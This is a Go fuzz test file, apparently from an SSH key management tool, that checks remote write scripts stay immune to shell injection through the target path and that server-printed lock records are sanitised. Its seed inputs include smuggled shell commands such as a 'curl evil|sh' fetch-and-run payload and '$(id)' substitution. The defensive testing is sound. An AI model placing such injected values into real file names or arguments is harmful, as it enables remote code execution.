package sshwrite

import (
	"os/exec"
	"regexp"
	"strings"
	"testing"

	"github.com/javadh75/SSHepherd/internal/sshconn"
)

// FuzzWriteCmds checks the two facts that together make shell injection
// through the target path impossible, without executing any write script
// (fuzz-executing scripts that mkdir/mv/rm at fuzz-chosen paths is not
// sandbox-safe; execution coverage for fixed hostile paths lives in
// TestWriteCmdThroughRealSh):
//
//  1. Template invariance: every builder's script starts with exactly one
//     sshconn.PathAssign(path), and the rest of the script is byte-identical
//     to the script built for a fixed reference path. The path therefore
//     enters the script nowhere else.
//  2. PathAssign evaluates to the path: run only PathAssign(path) followed by
//     printf of "$p" under /bin/sh with HOME=/h and no other environment; it
//     must print exactly path ("~/" expanded to "/h/"). A quoting escape
//     would run, split or expand the path instead of printing it.
//
// FuzzShQuote in internal/sshconn still guards ShQuote itself.
func FuzzWriteCmds(f *testing.F) {
	seeds := []string{
		"~/.ssh/authorized_keys",
		"/etc/o'brien/keys",
		"/tmp/x; curl evil|sh",
		"~/my keys/auth",
		"/tmp/$(id)/`id`",
		`/tmp/a"b`,
		"'",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	builders := map[string]func(string) string{
		"write absent":   func(p string) string { return writeCmdFor(p, Snapshot{Absent: true}, 42) },
		"write present":  func(p string) string { return writeCmdFor(p, SnapshotOf(false, []byte("x\n")), 42) },
		"restore":        func(p string) string { return restoreCmdFor(p, false, SnapshotOf(false, []byte("x\n"))) },
		"restore absent": func(p string) string { return restoreCmdFor(p, true, SnapshotOf(false, []byte("x\n"))) },
		"locked read":    lockedReadCmdFor,
	}
	const ref = "/ref/authorized_keys"
	f.Fuzz(func(t *testing.T, path string) {
		if strings.ContainsRune(path, 0) {
			t.Skip("NUL cannot survive execve; config validation rejects control characters")
		}
		for name, build := range builders {
			got, want := build(path), build(ref)
			rest, ok := strings.CutPrefix(got, sshconn.PathAssign(path))
			if !ok {
				t.Fatalf("%s: script does not start with PathAssign(%q):\n%s", name, path, got)
			}
			if wantRest := strings.TrimPrefix(want, sshconn.PathAssign(ref)); rest != wantRest {
				t.Fatalf("%s: path %q changed the script outside its PathAssign token:\n got %s\nwant %s", name, path, rest, wantRest)
			}
		}
		expect := path
		if r, ok := strings.CutPrefix(path, "~/"); ok {
			expect = "/h/" + r
		}
		c := exec.CommandContext(t.Context(), "sh", "-c", sshconn.PathAssign(path)+`; printf %s "$p"`)
		c.Env = []string{"HOME=/h"}
		out, err := c.Output()
		if err != nil || string(out) != expect {
			t.Fatalf("PathAssign(%q) evaluates to %q (err %v), want %q", path, out, err, expect)
		}
	})
}

// FuzzParseLockOwner: whatever a server prints, the description is a fixed
// string or the record's own safe alphabet, so remote bytes never reach a
// report raw; the age is unknown or non-negative.
func FuzzParseLockOwner(f *testing.F) {
	f.Add("sshepherd-lock 1010\nv1 ci-runner-3 4121 99 1000\n")
	f.Add("sshepherd-lock 1010\n")
	f.Add("sshepherd-lock 1010\nv1 \x1b]0;x\a 1 2 3\n")
	safe := regexp.MustCompile(`^[A-Za-z0-9._-]+ pid [0-9]+$`)
	f.Fuzz(func(t *testing.T, stdout string) {
		info := parseLockOwner(stdout)
		if info.known && !safe.MatchString(info.owner) {
			t.Fatalf("known owner %q is not in the record's alphabet", info.owner)
		}
		if !info.known && info.owner != ownerUnknown && info.owner != ownerUnrecognized {
			t.Fatalf("unknown owner %q is not a fixed description", info.owner)
		}
		if info.age != ageUnknown && info.age < 0 {
			t.Fatalf("age = %v", info.age)
		}
	})
}
